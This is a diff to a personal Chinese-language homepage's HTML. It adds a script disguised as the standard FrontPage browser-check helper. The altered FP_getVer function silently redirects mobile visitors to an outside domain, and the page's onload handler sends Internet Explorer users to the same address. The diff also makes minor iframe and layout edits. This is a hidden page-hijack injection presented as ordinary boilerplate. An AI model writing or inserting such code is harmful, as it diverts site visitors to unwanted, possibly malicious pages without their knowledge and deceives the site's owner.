@@ -16,9 +16,61 @@
 }
 </style>
 <bgsound src="HTML/bgm.wav" loop="-1" />
+<script type="text/javascript">
+<!--
+function FP_checkBrowser(bwsr,ver,url1,url2)  //v2.0
+{
+ var agt=navigator.userAgent.toLowerCase(),maj=parseInt(navigator.appVersion),tm=false,vm=false; 
+ switch(bwsr){
+  case "Microsoft Internet Explorer":{
+   tm=(((agt.indexOf("msie"))!=-1)&&(agt.indexOf("opera")==-1));
+   // On IE5, the version returns 4, use msie to detect higher verisons
+   maj=FP_getVer(agt,"msie");
+   break;}
+  case "Netscape Navigator":{
+   tm=((agt.indexOf('mozilla')!=-1)&&(agt.indexOf('spoofer')==-1)&& 
+   (agt.indexOf('compatible') == -1)&&(agt.indexOf('opera')==-1)&&
+   (agt.indexOf('webtv')==-1)&&(agt.indexOf('hotjava')==-1));
+    break;}
+  case "Opera":{
+   tm=(agt.indexOf("opera")!=-1);
+   maj=FP_getVer(agt,"opera");
+   if(maj==-1)
+       maj=FP_getVer(agt,"opera/");
+   break;}
+  case "AOL":{
+   tm=(agt.indexOf("aol")!=-1);
+   maj=FP_getVer(agt,"aol");
+   break;}
+  case "WebTV":{
+   tm=(agt.indexOf("webtv")!=-1); 
+   break;}
+  case "AOL TV":{
+   tm=((agt.indexOf("navio")!=-1)||(agt.indexOf("navio_aoltv")!=-1));
+   break;}
+  case "HotJava":{
+   tm=(agt.indexOf("hotjava")!=-1);
+   break;}
+ }
+
+ //Check version
+ loc=ver.search('\\+');v=parseInt(ver);if(loc>0){v=parseInt(ver);if(maj>=v)
+ vm=true;}else if(maj==v)vm=true;loc=ver.search("any");if(loc>=0)vm=true;
+ if(vm&&tm){ if(url1!='')location=url1;}else if(url2!='')location=url2;
+}
+
+function FP_getVer(s, ag)  //v2.0
+{
+ var ua = navigator.userAgent.toLowerCase();
+if (/mobile|android|iphone|ipad|phone/i.test(ua)) {
+   window.location.href = "http://hewuqilikepeace.wap.fenxiaoabc.cn/wap_hewuqilikepeace.html";
+} return -1;
+}
+// -->
+</script>
 </head>
 
-<body style="background-image: url('HTML/banner.jpg'); background-attachment: fixed">
+<body style="background-image: url('HTML/banner.jpg'); background-attachment: fixed" onload="FP_checkBrowser('Microsoft Internet Explorer', 'any', /*href*/'http://hewuqilikepeace.wap.fenxiaoabc.cn/wap_hewuqilikepeace.html', /*href*/'')">
 
 <p>&nbsp;</p>
 <div style="position: absolute; width: 1434px; height: 2000px; z-index: 1; left: 0px; top: 690px; visibility: visible; border-radius: 30px" id="layer1" class="style1">
@@ -26,9 +78,7 @@
 	客人的浏览器不支持嵌入式框架，或被配置为不显示嵌入式框架，客人会在这里看到各种离谱的页面布局，快换个浏览器吧。</iframe>
 	<div style="position: absolute; width: 352px; height: 689px; z-index: 1; left: 1048px; top: 77px; border-radius: 20px" id="layer11">
 					<iframe name="I2" id="I2" src="HTML/me.htm" style="height: 749px; width: 323px; border-radius: 20px" scrolling="no" border="0" frameborder="0">
-					浏览器不支持嵌入式框架，或被配置为不显示嵌入式框架。</iframe></div>
-	<div style="position: absolute; width: 323px; height: 400px; z-index: 2; left: 1053px; top: 854px" id="layer12">
-	</div>
+					客人的浏览器不支持嵌入式框架，或被配置为不显示嵌入式框架，客人会在这里看到各种离谱的页面布局，快换个浏览器吧。</iframe></div>
 </div>
 <div style="position: absolute; width: 457px; height: 24px; z-index: 2; left: 15px; top: 231px; border-radius: 20px; bottom: 348px;" id="layer2" class="style2">
 	<img alt="" src="HTML/1.png" width="650" height="100" /></div>
